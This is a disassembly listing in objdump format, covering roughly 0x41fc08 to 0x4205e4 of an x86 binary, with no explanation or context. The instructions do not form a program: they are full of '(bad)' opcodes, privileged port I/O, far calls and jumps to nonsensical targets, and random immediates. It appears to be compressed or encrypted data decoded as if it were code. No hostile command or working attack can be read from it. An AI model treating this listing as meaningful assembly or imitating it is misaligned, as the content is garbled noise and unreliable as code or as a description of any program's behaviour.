  41fc08:	add    eax,0xb2000001
  41fc0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc0e:	cmc    
  41fc0f:	mov    DWORD PTR [edi],ebp
  41fc11:	hlt    
  41fc12:	push   0xef8a02e2
  41fc17:	(bad)  [ecx]
  41fc19:	repz inc edx
  41fc1b:	call   0x79f6:0xb11d6654
  41fc22:	xor    BYTE PTR [ebp-0x70],cl
  41fc25:	lahf   
  41fc26:	jmp    0x41fbad
  41fc28:	ins    BYTE PTR es:[edi],dx
  41fc29:	adc    BYTE PTR [ecx],cl
  41fc2b:	mov    edi,0x71e60824
  41fc30:	pusha  
  41fc31:	cdq    
  41fc32:	xchg   esi,eax
  41fc33:	in     eax,0x8a
  41fc35:	mov    bl,0xb7
  41fc37:	(bad)
  41fc3a:	imul   BYTE PTR [eax-0x2c7a5d18]
  41fc40:	dec    ebp
  41fc41:	xchg   ebp,eax
  41fc42:	popa   
  41fc43:	(bad)  
  41fc44:	std    
  41fc45:	in     al,dx
  41fc46:	adc    al,0x98
  41fc48:	or     BYTE PTR [eax+0x6caaf2b8],0x5f
  41fc4f:	(bad)  
  41fc51:	leave  
  41fc52:	popa   
  41fc53:	cmp    edi,DWORD PTR [ebx+0x726be1f2]
  41fc59:	test   bl,0x64
  41fc5c:	inc    ebp
  41fc5d:	sub    DWORD PTR [ecx-0xfb78a3],0x82e7d015
  41fc67:	inc    esi
  41fc68:	fdiv   QWORD PTR [ebx-0x34]
  41fc6b:	push   0x3219197c
  41fc70:	or     DWORD PTR [ebx+0x108eb38],ebx
  41fc76:	test   BYTE PTR [ebx-0x3d],dl
  41fc79:	(bad)  
  41fc7b:	sub    DWORD PTR [ebp-0x3b],esi
  41fc7e:	cmp    al,0x19
  41fc80:	div    esp
  41fc82:	and    eax,0x61cf52df
  41fc87:	push   0xffffff8d
  41fc89:	xchg   BYTE PTR ds:0x13a8e036,cl
  41fc8f:	fisubr DWORD PTR [ebx]
  41fc91:	mov    ah,0xb5
  41fc93:	inc    ebx
  41fc94:	outs   dx,DWORD PTR ds:[esi]
  41fc95:	mov    ds:0xb363dcb7,eax
  41fc9a:	push   cs
  41fc9b:	out    dx,al
  41fc9c:	sub    eax,0x362bcb21
  41fca1:	xchg   esp,eax
  41fca2:	mov    bh,0x4f
  41fca4:	xlat   BYTE PTR ds:[ebx]
  41fca5:	loop   0x41fc2b
  41fca7:	dec    ebp
  41fca8:	loop   0x41fc64
  41fcaa:	lahf   
  41fcab:	inc    eax
  41fcac:	pop    edi
  41fcad:	xchg   DWORD PTR [ebx],esi
  41fcaf:	add    bh,BYTE PTR [edx]
  41fcb1:	fs inc ebp
  41fcb3:	mov    bh,0x3f
  41fcb5:	pop    ds
  41fcb6:	adc    cl,bl
  41fcb8:	inc    esi
  41fcb9:	xchg   esp,eax
  41fcba:	sbb    ecx,DWORD PTR [edx-0x11]
  41fcbd:	mov    bh,0x80
  41fcbf:	adc    DWORD PTR [ecx-0x4f0d0bb7],0x34966619
  41fcc9:	call   0xb3e069f2
  41fcce:	inc    esp
  41fccf:	inc    eax
  41fcd0:	cmp    al,0x67
  41fcd2:	in     eax,dx
  41fcd3:	repz dec esp
  41fcd5:	pop    esi
  41fcd6:	and    ah,BYTE PTR [edi+0x3f]
  41fcd9:	fistp  WORD PTR [ebp+eiz*1+0x2d04016f]
  41fce0:	push   edi
  41fce1:	pop    esi
  41fce2:	fst    QWORD PTR [ebp+ecx*2+0x557ed6a5]
  41fce9:	int    0x81
  41fceb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcec:	mov    ds:0xd8493a6d,eax
  41fcf1:	mov    al,0xa7
  41fcf3:	mov    edx,0xc12c4cfe
  41fcf8:	outs   dx,DWORD PTR ds:[esi]
  41fcf9:	inc    esp
  41fcfa:	dec    ecx
  41fcfb:	pop    esi
  41fcfc:	imul   eax,DWORD PTR [edi+ebp*8-0x44],0x6e
  41fd01:	jb     0x41fd56
  41fd03:	pop    es
  41fd04:	xchg   esp,ecx
  41fd06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd07:	sbb    bl,BYTE PTR [ebp+eax*1-0x2d5d7309]
  41fd0e:	rcl    BYTE PTR es:[ecx+0x0],0x0
	...
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd81:	push   eax
  41fd82:	jge    0x41fd09
  41fd84:	push   edi
  41fd85:	push   ebx
  41fd86:	add    DWORD PTR [eax],eax
  41fd88:	add    eax,0xa6000001
  41fd8d:	xchg   ecx,eax
  41fd8e:	int    0x4a
  41fd90:	clc    
  41fd91:	cwde   
  41fd92:	inc    ebp
  41fd93:	push   edi
  41fd94:	push   0x55a0e3fd
  41fd99:	fild   DWORD PTR [ebx-0x26]
  41fd9c:	sub    ah,BYTE PTR [edi-0xc153e62]
  41fda2:	fist   DWORD PTR [edi-0x1bf1cce]
  41fda8:	and    edi,ebx
  41fdaa:	and    DWORD PTR [edi-0x876bcef],ecx
  41fdb0:	mov    esp,0x46fa91ac
  41fdb5:	push   ss
  41fdb6:	sub    BYTE PTR [ebx],0x8d
  41fdb9:	rol    BYTE PTR [eax+ebp*8-0x16],1
  41fdbd:	push   0xffffffd8
  41fdbf:	xchg   ebx,eax
  41fdc0:	xchg   ecx,eax
  41fdc1:	(bad)  
  41fdc2:	adc    DWORD PTR [ecx-0x47dc984b],ebp
  41fdc8:	xchg   esp,eax
  41fdc9:	in     al,0xfe
  41fdcb:	jmp    0x41fe1a
  41fdcd:	jae    0x41fdb3
  41fdcf:	mov    esp,0x777b3c13
  41fdd4:	imul   esi,eax,0xc72a9fa0
  41fdda:	jge    0x41fe3f
  41fddc:	push   es
  41fddd:	fwait
  41fdde:	sub    al,0x49
  41fde0:	mov    bh,0x96
  41fde2:	pushf  
  41fde3:	cdq    
  41fde4:	sub    BYTE PTR [ebp+0x527af5c],0x55
  41fdeb:	jno    0x41fdf6
  41fded:	loop   0x41fd88
  41fdef:	mov    ecx,0xd0365995
  41fdf4:	lahf   
  41fdf5:	call   0x7e030be4
  41fdfa:	add    DWORD PTR [ecx],0x57
  41fdfd:	or     eax,0xe061e55d
  41fe02:	aas    
  41fe03:	cmc    
  41fe04:	xor    al,0x72
  41fe06:	lea    ecx,[eax+0x787e54f7]
  41fe0c:	cld    
  41fe0d:	frstor [esi+0x74cb1cdf]
  41fe13:	sbb    eax,0x193a33de
  41fe18:	mov    al,ds:0xc01eda7
  41fe1e:	enter  0xc33a,0xef
  41fe22:	mov    ecx,0x2135a433
  41fe27:	jbe    0x41fe03
  41fe29:	stos   BYTE PTR es:[edi],al
  41fe2a:	fisubr DWORD PTR [edi+0x7a66091f]
  41fe30:	xchg   ebp,eax
  41fe31:	dec    eax
  41fe32:	xlat   BYTE PTR ds:[ebx]
  41fe33:	pop    ds
  41fe34:	mov    al,ds:0x2f5139c2
  41fe39:	out    dx,eax
  41fe3a:	mov    edx,0xa4a869e1
  41fe3f:	mov    edi,0x6b5aab1d
  41fe44:	int3   
  41fe45:	pop    es
  41fe46:	dec    ecx
  41fe47:	ins    BYTE PTR es:[edi],dx
  41fe48:	(bad)  
  41fe49:	push   edx
  41fe4a:	add    DWORD PTR [esi-0x6debda83],edx
  41fe50:	push   ecx
  41fe51:	shl    DWORD PTR [edx],cl
  41fe53:	(bad)  
  41fe54:	sbb    esp,DWORD PTR [edx+0x10dee3cf]
  41fe5a:	(bad)  
  41fe5c:	shl    BYTE PTR [edx],cl
  41fe5e:	int3   
  41fe5f:	add    al,0x71
  41fe61:	lods   eax,DWORD PTR ds:[esi]
  41fe62:	les    esi,FWORD PTR [ebp+ebx*2+0x15]
  41fe66:	rcl    BYTE PTR [esi],cl
  41fe68:	jmp    0x41fe7f
  41fe6a:	fcomp  QWORD PTR [edi]
  41fe6c:	nop
  41fe6d:	rcr    DWORD PTR [ebp+0x30],0x9e
  41fe71:	mov    esp,0xb60f054c
  41fe76:	aam    0x8e
  41fe78:	xchg   DWORD PTR [edx+0x11f5b41b],ecx
  41fe7e:	mov    dl,0xbb
  41fe80:	outs   dx,DWORD PTR ds:[esi]
  41fe81:	jae    0x41fe1e
  41fe83:	push   eax
  41fe84:	das    
  41fe85:	(bad)  
  41fe86:	xchg   edi,eax
  41fe87:	push   edi
  41fe88:	mov    al,0x97
  41fe8a:	mov    esi,0xbeabb1cc
  41fe8f:	inc    ecx
  41fe90:	cmp    DWORD PTR [eax],eax
	...
  41fef2:	add    BYTE PTR [eax],al
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0xb1
  41ff01:	pop    gs
  41ff03:	imul   ebx,DWORD PTR [esp+edx*2+0x1],0x0
  41ff08:	add    eax,0x95000001
  41ff0d:	aad    0xfc
  41ff0f:	fdivr  QWORD PTR [ebx+edx*2]
  41ff12:	push   eax
  41ff13:	xchg   esp,eax
  41ff14:	in     al,dx
  41ff15:	mov    ds:0x46daa6f6,al
  41ff1a:	inc    edx
  41ff1b:	jo     0x41ff9a
  41ff1d:	cdq    
  41ff1e:	xor    BYTE PTR [edi],ah
  41ff20:	xchg   edx,eax
  41ff21:	rcl    DWORD PTR [esi-0x6a6bba20],cl
  41ff27:	popf   
  41ff28:	jl     0x41ff1e
  41ff2a:	int3   
  41ff2b:	mov    dl,0x1b
  41ff2d:	pop    es
  41ff2e:	(bad)  
  41ff30:	lods   al,BYTE PTR ds:[esi]
  41ff31:	pop    ds
  41ff32:	sbb    ch,BYTE PTR [edi]
  41ff34:	(bad)  
  41ff35:	aam    0x1b
  41ff37:	xchg   ecx,eax
  41ff38:	iret   
  41ff39:	es push ebx
  41ff3b:	lea    ebx,[edx-0x16f847b5]
  41ff41:	stc    
  41ff42:	and    al,0x7b
  41ff44:	add    BYTE PTR [edx],0x17
  41ff47:	xlat   BYTE PTR ds:[ebx]
  41ff48:	sbb    al,0x3c
  41ff4a:	stos   BYTE PTR es:[edi],al
  41ff4b:	shl    DWORD PTR [eax+0x695a668d],cl
  41ff51:	clc    
  41ff52:	mov    ds:0x35063de4,al
  41ff57:	imul   edi,DWORD PTR [ebx-0x69],0x3a0b5cfd
  41ff5e:	inc    esi
  41ff5f:	nop
  41ff60:	pop    es
  41ff61:	jmp    0x2281:0x6121d363
  41ff68:	jbe    0x41ffbd
  41ff6a:	mov    ds:0xe6537750,al
  41ff6f:	xor    BYTE PTR [ecx-0x7104ad8a],dl
  41ff75:	dec    ebp
  41ff76:	not    BYTE PTR [ebp-0x30c30b4]
  41ff7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff7d:	or     DWORD PTR ds:0x3556de6,esi
  41ff83:	push   0x2558b932
  41ff88:	gs loopne 0x41ffec
  41ff8b:	ins    DWORD PTR es:[edi],dx
  41ff8c:	les    ebp,FWORD PTR [edx-0x5fca1f7c]
  41ff92:	adc    cl,0x67
  41ff95:	dec    edx
  41ff96:	loop   0x420006
  41ff98:	adc    BYTE PTR [edi+ebx*4+0x6e10ac2e],bh
  41ff9f:	and    DWORD PTR [ecx],0xe5396e05
  41ffa5:	repnz push 0xffffff99
  41ffa8:	xor    ebx,DWORD PTR [ebx-0xd]
  41ffab:	inc    esp
  41ffac:	(bad)  [ebp-0x4ff7b63c]
  41ffb2:	sub    al,0x64
  41ffb4:	ds sbb edi,0x5bbe1d48
  41ffbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffbc:	(bad)  
  41ffbd:	cmp    BYTE PTR [edi+0x27b9a2c1],ah
  41ffc3:	xor    eax,0xbf1042df
  41ffc8:	ret    0x1a20
  41ffcb:	lods   al,BYTE PTR ds:[esi]
  41ffcc:	xlat   BYTE PTR ds:[ebx]
  41ffcd:	shl    ebp,0x36
  41ffd0:	adc    BYTE PTR ds:[esp+edx*8],0xc1
  41ffd5:	shl    cl,1
  41ffd7:	je     0x41ff71
  41ffd9:	sub    DWORD PTR [edi],ecx
  41ffdb:	pop    edi
  41ffdc:	mov    eax,0xad59208d
  41ffe1:	enter  0xe000,0x92
  41ffe5:	xchg   edx,eax
  41ffe6:	fbstp  TBYTE PTR ds:0xcc8519e4
  41ffed:	lock xchg DWORD PTR [esi],ecx
  41fff0:	add    al,0x15
  41fff2:	nop
  41fff3:	inc    edi
  41fff4:	ins    DWORD PTR es:[edi],dx
  41fff5:	mov    WORD PTR [ecx],?
  41fff7:	and    edi,DWORD PTR [esi]
  41fff9:	sbb    al,0x59
  41fffb:	push   ecx
  41fffc:	retf   0xe8e3
  41ffff:	psubq  mm6,mm3
  420002:	push   0xf2e28160
  420007:	xor    al,0x3e
  420009:	mov    bh,0xcd
  42000b:	imul   esp,DWORD PTR [edi-0x19d7658],0x0
	...
  420072:	add    BYTE PTR [eax],al
  420074:	bound  esp,QWORD PTR [ebp-0x8808a]
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x21
  420081:	mov    esp,DWORD PTR [edi]
  420083:	test   eax,0x15561
  420088:	add    eax,0xfd000001
  42008d:	mov    ecx,0xa9a7e75
  420092:	xchg   esi,eax
  420093:	test   BYTE PTR [ebx-0x73],cl
  420096:	jno    0x420048
  420098:	in     al,0x38
  42009a:	mov    ah,0x84
  42009c:	stos   BYTE PTR es:[edi],al
  42009d:	retf   
  42009e:	add    bl,BYTE PTR [ecx]
  4200a0:	jp     0x420111
  4200a2:	call   0x5be4:0xa156b83
  4200a9:	test   al,0xe8
  4200ab:	outs   dx,DWORD PTR ds:[esi]
  4200ac:	or     BYTE PTR [eax-0x480826fb],0x94
  4200b3:	call   0xc121:0xf3d17cd5
  4200ba:	fs sub dh,0x96
  4200be:	push   edx
  4200bf:	out    dx,eax
  4200c0:	add    DWORD PTR [ecx-0x75],edx
  4200c3:	popf   
  4200c4:	inc    eax
  4200c5:	jge    0x4200a2
  4200c7:	mov    dh,0xb0
  4200c9:	in     al,dx
  4200ca:	push   cs
  4200cb:	pop    esi
  4200cc:	fiadd  DWORD PTR [edi]
  4200ce:	mov    al,0xa7
  4200d0:	or     eax,0x845870e0
  4200d5:	aaa    
  4200d6:	sar    DWORD PTR [ecx-0x351ffbe2],1
  4200dc:	rcr    DWORD PTR [edi],cl
  4200de:	push   ss
  4200df:	xchg   ecx,edi
  4200e1:	enter  0x8c27,0x2c
  4200e5:	dec    DWORD PTR [edx+0x32a01a19]
  4200eb:	sub    dl,al
  4200ed:	mov    ch,0xd7
  4200ef:	push   edx
  4200f0:	cwde   
  4200f1:	out    0xd1,eax
  4200f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200f4:	in     al,0xe7
  4200f6:	sub    ecx,DWORD PTR [ecx]
  4200f8:	outs   dx,DWORD PTR ds:[esi]
  4200f9:	xchg   ebx,eax
  4200fa:	sub    BYTE PTR [eax],0x53
  4200fd:	stc    
  4200fe:	push   0x7bc6ef93
  420103:	cdq    
  420104:	mov    bh,0xf9
  420106:	daa    
  420107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420108:	outs   dx,DWORD PTR ds:[esi]
  420109:	(bad)  
  42010b:	inc    eax
  42010c:	stc    
  42010d:	repnz xchg ebx,eax
  42010f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420110:	jbe    0x4200d2
  420112:	add    DWORD PTR [ebp+0x73],edx
  420115:	xor    al,0x2c
  420118:	adc    esi,DWORD PTR [eax-0x67]
  42011b:	and    al,ah
  42011d:	push   ss
  42011e:	push   eax
  42011f:	dec    DWORD PTR [edi-0x34]
  420122:	iret   
  420123:	pop    es
  420124:	jbe    0x420114
  420126:	xor    esi,DWORD PTR [eax-0x39]
  420129:	cmp    BYTE PTR [edi-0x1a07799c],ah
  42012f:	jae    0x420155
  420131:	mov    cl,0x98
  420133:	adc    al,0x75
  420135:	addr16 jns 0x4200fe
  420138:	iret   
  420139:	mov    ebp,0x8ae3a862
  42013e:	cmp    DWORD PTR [esi],0xffffffbf
  420141:	pop    edi
  420142:	add    ebp,ebp
  420144:	les    eax,FWORD PTR [esi-0x2f669b68]
  42014a:	ins    BYTE PTR es:[edi],dx
  42014b:	mov    ecx,gs
  42014d:	jge    0x420117
  42014f:	xlat   BYTE PTR ds:[ebx]
  420150:	dec    ecx
  420151:	sti    
  420152:	call   0xd5cc5cdf
  420157:	bound  ebp,QWORD PTR ds:0x1fec8acd
  42015d:	or     esp,edi
  42015f:	inc    esp
  420160:	pop    eax
  420161:	xchg   ecx,eax
  420162:	leave  
  420163:	adc    DWORD PTR [ebx],eax
  420165:	adc    eax,DWORD PTR [ebx+0x30]
  420168:	xchg   al,dh
  42016a:	mov    al,0x17
  42016c:	popa   
  42016d:	fisub  DWORD PTR fs:[eax-0x2fd15f3b]
  420174:	fild   DWORD PTR [eax+esi*8]
  420177:	neg    BYTE PTR [esp+esi*2-0x7f]
  42017b:	gs jb  0x4201f9
  42017e:	not    DWORD PTR [eax-0x338441cf]
  420184:	sbb    al,0x13
  420186:	(bad)  
  420187:	je     0x4201c4
  420189:	xchg   ecx,eax
  42018a:	dec    edi
  42018b:	dec    esi
  42018c:	int3   
  42018d:	sbb    esp,DWORD PTR [eax+0xac7b]
	...
  4201f3:	add    BYTE PTR [ebx-0x31],dh
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx-0x56814e8c],1
  420204:	push   si
  420206:	add    DWORD PTR [eax],eax
  420208:	add    eax,0xd0000001
  42020d:	ret    
  42020e:	ja     0x4201ef
  420210:	ror    DWORD PTR [ecx],0x2d
  420213:	sbb    al,0x97
  420215:	mov    ebp,0xae03a86d
  42021a:	sub    DWORD PTR [eax-0x41a0f9],edx
  420220:	mov    cl,0x83
  420222:	cmp    dl,BYTE PTR [edi+eiz*8+0x4f]
  420226:	jno    0x420259
  420228:	or     al,0xd7
  42022a:	inc    ecx
  42022b:	add    eax,0x1ddfdd1c
  420230:	and    eax,0x99664ee2
  420235:	es push ss
  420237:	out    0xb4,eax
  420239:	jnp    0x420242
  42023b:	pop    edx
  42023c:	cmp    eax,0x32ff0bcd
  420241:	jge    0x4201fe
  420243:	sub    al,0xf
  420245:	je     0x42023c
  420247:	inc    esp
  420248:	dec    BYTE PTR [eax+0x4e]
  42024b:	and    cl,al
  42024d:	xchg   BYTE PTR [ebx-0x24],ah
  420250:	inc    edi
  420251:	(bad)  
  420252:	jmp    0x3b646eb3
  420257:	lock push eax
  420259:	fsubr  st(3),st
  42025b:	idiv   BYTE PTR [eax+0x17]
  42025e:	clc    
  42025f:	fdivr  QWORD PTR [esi]
  420261:	cli    
  420262:	sbb    edi,DWORD PTR [ebx]
  420264:	js     0x42021e
  420266:	bound  ecx,QWORD PTR [eax+ebx*4]
  420269:	jne    0x420288
  42026b:	push   0xc27a9f25
  420270:	retf   0x753b
  420273:	add    eax,0xea3d044c
  420278:	pop    esi
  420279:	sbb    ecx,DWORD PTR [edx+0x6a]
  42027c:	dec    ebx
  42027d:	jg     0x4202e9
  42027f:	ret    0x6134
  420282:	sub    DWORD PTR [edi],0xa93f8f45
  420288:	hlt    
  420289:	xchg   ebp,eax
  42028a:	sti    
  42028b:	(bad)  
  42028c:	out    dx,al
  42028d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42028e:	out    dx,al
  42028f:	int    0xe9
  420291:	icebp  
  420292:	inc    edi
  420293:	or     al,cl
  420295:	mov    edx,0x3491f900
  42029a:	imul   esi,DWORD PTR [ebp-0x663c16ff],0x30
  4202a1:	sub    al,0xf3
  4202a3:	mov    ds:0x246cae4a,eax
  4202a8:	or     al,0x2c
  4202aa:	jno    0x42027a
  4202ac:	inc    edx
  4202ad:	adc    BYTE PTR [eax],bh
  4202af:	pop    ecx
  4202b0:	fidiv  WORD PTR [edx+0x7a0251c0]
  4202b6:	in     al,0xe0
  4202b8:	adc    bh,bh
  4202ba:	jecxz  0x4202cc
  4202bc:	imul   ecx,DWORD PTR [ecx],0x63
  4202bf:	iret   
  4202c0:	xchg   edi,eax
  4202c1:	clc    
  4202c2:	cs mov ecx,0x31f3e709
  4202c8:	sbb    eax,esp
  4202ca:	jb     0x4202ad
  4202cc:	sbb    cl,BYTE PTR [edx]
  4202ce:	add    BYTE PTR [edi+0x2f5d3979],al
  4202d4:	imul   ebx,DWORD PTR [ebp-0x5d05656f],0xffffffe4
  4202db:	aam    0xed
  4202dd:	addr16 aam 0x8c
  4202e0:	jmp    0x3657f6d2
  4202e5:	sub    dl,ch
  4202e7:	(bad)  
  4202e8:	popa   
  4202e9:	ror    DWORD PTR [edi+0x28ed24a9],cl
  4202ef:	fs jp  0x420337
  4202f2:	cmp    ebp,DWORD PTR [edx-0xb3a6d9a]
  4202f8:	(bad)  
  4202f9:	xor    eax,0x8e1576d4
  4202fe:	int3   
  4202ff:	gs xchg ecx,eax
  420301:	mov    eax,0x6b0b1416
  420306:	xor    ebp,edi
  420308:	cmp    al,0xb2
  42030a:	add    DWORD PTR [eax],ebp
  42030c:	sbb    DWORD PTR [ebp+0x80a512],edx
	...
  420372:	add    BYTE PTR [eax],al
  420374:	inc    ecx
  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	push   0x6bfc679a
  420385:	push   edi
  420386:	add    DWORD PTR [eax],eax
  420388:	add    eax,0x90000001
  42038d:	xor    BYTE PTR cs:[edx-0x59269b0d],dl
  420394:	das    
  420395:	push   ebx
  420396:	(bad)  
  420397:	fsubr  DWORD PTR [edi+0x43]
  42039a:	scas   al,BYTE PTR es:[edi]
  42039b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42039c:	mov    edx,0x82024571
  4203a1:	fst    QWORD PTR [edx-0x78cc8787]
  4203a7:	cmp    al,0x8d
  4203a9:	mov    al,0xbe
  4203ab:	cmp    dh,bl
  4203ad:	push   es
  4203ae:	fwait
  4203af:	and    esi,DWORD PTR [ebx]
  4203b1:	jbe    0x4203c9
  4203b3:	adc    DWORD PTR [eax+ebp*2+0x75ab390b],ebx
  4203ba:	inc    ecx
  4203bb:	adc    eax,0x663eb617
  4203c0:	add    cl,BYTE PTR [esi+0x78a32b63]
  4203c6:	mov    eax,0x6cd288c8
  4203cb:	xor    ah,bl
  4203cd:	iret   
  4203ce:	ret    
  4203cf:	jp     0x4203f5
  4203d1:	sbb    al,0x7f
  4203d3:	pop    edx
  4203d4:	loop   0x4203a9
  4203d6:	xchg   ebx,eax
  4203d7:	sar    edi,cl
  4203d9:	jecxz  0x42035e
  4203db:	mov    ss,WORD PTR [ebp-0x4fee89c5]
  4203e1:	pop    es
  4203e2:	xor    ebp,edx
  4203e4:	imul   edx,DWORD PTR [edx],0xe38d534e
  4203ea:	add    al,0x6a
  4203ec:	or     eax,0x98cc33fb
  4203f1:	lea    esp,[edx+0xc]
  4203f4:	pop    edx
  4203f5:	scas   al,BYTE PTR es:[edi]
  4203f6:	mov    bh,0x2f
  4203f8:	iret   
  4203f9:	stos   BYTE PTR es:[edi],al
  4203fa:	push   es
  4203fb:	je     0x4203ec
  4203fd:	rol    DWORD PTR ds:0xfd460b17,cl
  420403:	pop    ebp
  420404:	out    dx,eax
  420405:	sbb    BYTE PTR [edx+ebp*4-0x13065417],ah
  42040c:	mov    al,ds:0x4d9ace1a
  420411:	lods   al,BYTE PTR ds:[esi]
  420412:	dec    edi
  420413:	and    eax,0xc36df1fd
  420418:	shl    BYTE PTR [edx+ebp*8-0x2d],cl
  42041c:	mov    DWORD PTR [esp+ecx*4],0xb76653fd
  420423:	mov    dl,BYTE PTR [ebp+0x72]
  420426:	cwde   
  420427:	add    eax,0x332aeaed
  42042c:	pop    ebp
  42042d:	popa   
  42042e:	xchg   edi,eax
  42042f:	fcom   DWORD PTR [esi+0x70]
  420432:	ja     0x420401
  420434:	jp     0x4203f7
  420436:	push   es
  420437:	cmp    esp,edx
  420439:	xchg   edx,eax
  42043a:	pop    ebx
  42043b:	jae    0x420413
  42043d:	ficom  DWORD PTR [esi+0x564d6fe3]
  420443:	pop    ebp
  420444:	js     0x420484
  420446:	cmp    eax,0xd08a13a4
  42044b:	dec    ecx
  42044c:	cs inc ecx
  42044e:	inc    eax
  42044f:	mov    al,0x99
  420451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420452:	fldenv [esi+0x5b4ad82f]
  420458:	or     BYTE PTR [eax],ah
  42045a:	xor    eax,0xcbd8701b
  42045f:	add    esp,edi
  420461:	inc    ecx
  420462:	into   
  420463:	retf   0x89cc
  420466:	sub    ebx,ecx
  420468:	in     al,0x71
  42046a:	dec    esi
  42046b:	lds    edi,FWORD PTR [ecx+0x53]
  42046e:	xor    BYTE PTR [esi-0x50],dh
  420471:	xor    DWORD PTR [edi-0x1750aeb5],ecx
  420477:	xlat   BYTE PTR ds:[ebx]
  420478:	loopne 0x420416
  42047a:	jns    0x42048b
  42047c:	inc    esp
  42047d:	pop    ds
  42047e:	lods   eax,DWORD PTR ds:[esi]
  42047f:	jbe    0x42045a
  420481:	push   cs
  420482:	clc    
  420483:	jmp    0xeb7b5b89
  420488:	cdq    
  420489:	lds    edi,FWORD PTR [esi+0x62]
  42048c:	mov    bh,0x0
  42048e:	pop    es
  42048f:	fld    QWORD PTR [ebx]
	...
  4204f1:	add    BYTE PTR [eax],al
  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	push   0x703b59f9
  420505:	pop    eax
  420506:	add    DWORD PTR [eax],eax
  420508:	add    eax,0xa7000001
  42050d:	iret   
  42050e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42050f:	jbe    0x4204ec
  420511:	out    0x48,eax
  420513:	lds    eax,FWORD PTR [eax-0x29]
  420516:	fisub  DWORD PTR [edx]
  420518:	xchg   ebp,eax
  420519:	(bad)  
  42051a:	cmp    al,0x99
  42051c:	jmp    0x2138afe3
  420521:	push   ecx
  420522:	stc    
  420523:	imul   ebx,DWORD PTR [ecx+0x1f],0x5c045478
  42052a:	mov    WORD PTR [edi+ebp*8-0x37],ss
  42052e:	xchg   edx,eax
  42052f:	and    esi,DWORD PTR [ebp+0x56]
  420532:	ret    
  420533:	inc    ebx
  420534:	data16 rcr BYTE PTR [edi+0x5b],cl
  420538:	rol    BYTE PTR ds:0x2d9c6bb2,cl
  42053e:	push   0xffffffb9
  420540:	(bad)  
  420541:	loopne 0x420559
  420543:	stos   BYTE PTR es:[edi],al
  420544:	jmp    0x4204e8
  420546:	pop    eax
  420547:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420548:	mov    eax,DWORD PTR [eax-0x7d]
  42054b:	scas   eax,DWORD PTR es:[edi]
  42054c:	xchg   edi,eax
  42054d:	ins    DWORD PTR es:[edi],dx
  42054e:	push   ds
  42054f:	mov    bl,0x5
  420551:	jnp    0x420513
  420553:	mov    esi,DWORD PTR [esp+edi*4+0x5b734f9f]
  42055a:	aas    
  42055b:	jae    0x4205ae
  42055d:	(bad)  
  420560:	out    0x18,al
  420562:	fldcw  WORD PTR [edi-0x14]
  420565:	outs   dx,DWORD PTR ds:[esi]
  420566:	inc    ecx
  420567:	xor    BYTE PTR [ebx+0x6d],ch
  42056a:	push   ss
  42056b:	jb     0x4204fb
  42056d:	lahf   
  42056e:	pop    esp
  42056f:	dec    eax
  420570:	nop
  420571:	(bad)  
  420572:	test   BYTE PTR ds:0xc915c8b1,0xa2
  420579:	inc    edx
  42057a:	int3   
  42057b:	cmp    edx,DWORD PTR [ebx]
  42057d:	fwait
  42057e:	xchg   esi,eax
  42057f:	jns    0x420577
  420581:	or     bh,BYTE PTR [eax-0x541f069c]
  420587:	sbb    BYTE PTR [ebx],ch
  420589:	(bad)  
  42058a:	jl     0x42058f
  42058c:	and    dl,BYTE PTR [edx]
  42058e:	push   ecx
  42058f:	enter  0x6869,0x8c
  420593:	push   esp
  420594:	fdivrp st(2),st
  420596:	sbb    DWORD PTR [edi-0x132764e4],edi
  42059c:	adc    BYTE PTR [ecx],dh
  42059e:	and    BYTE PTR [edi+eiz*1],ah
  4205a1:	popa   
  4205a2:	xor    ch,BYTE PTR [edi+ebp*1-0x563a9ccb]
  4205a9:	leave  
  4205aa:	not    DWORD PTR ds:0xf83d1a2f
  4205b0:	clc    
  4205b1:	neg    BYTE PTR [eax+edi*2-0x3]
  4205b5:	sti    
  4205b6:	jnp    0x420581
  4205b8:	jle    0x4205ec
  4205ba:	aam    0xbf
  4205bc:	xor    ebx,ebp
  4205be:	(bad)  
  4205bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205c0:	or     DWORD PTR [ecx+0xd166b65],0xffffffed
  4205c7:	in     eax,dx
  4205c8:	test   eax,0x4fb3be38
  4205cd:	test   edx,ebp
  4205cf:	lahf   
  4205d0:	outs   dx,DWORD PTR ds:[esi]
  4205d1:	ficom  WORD PTR [ecx]
  4205d3:	add    DWORD PTR [esi-0x6f],eax
  4205d6:	adc    ecx,eax
  4205d8:	fnstenv [edi+0x38]
  4205db:	sar    edx,0xa1
  4205de:	jecxz  0x4205cb
  4205e0:	(bad)  
  4205e1:	shl    DWORD PTR [esp+eax*4],cl
  4205e4:	mov    ?,ecx
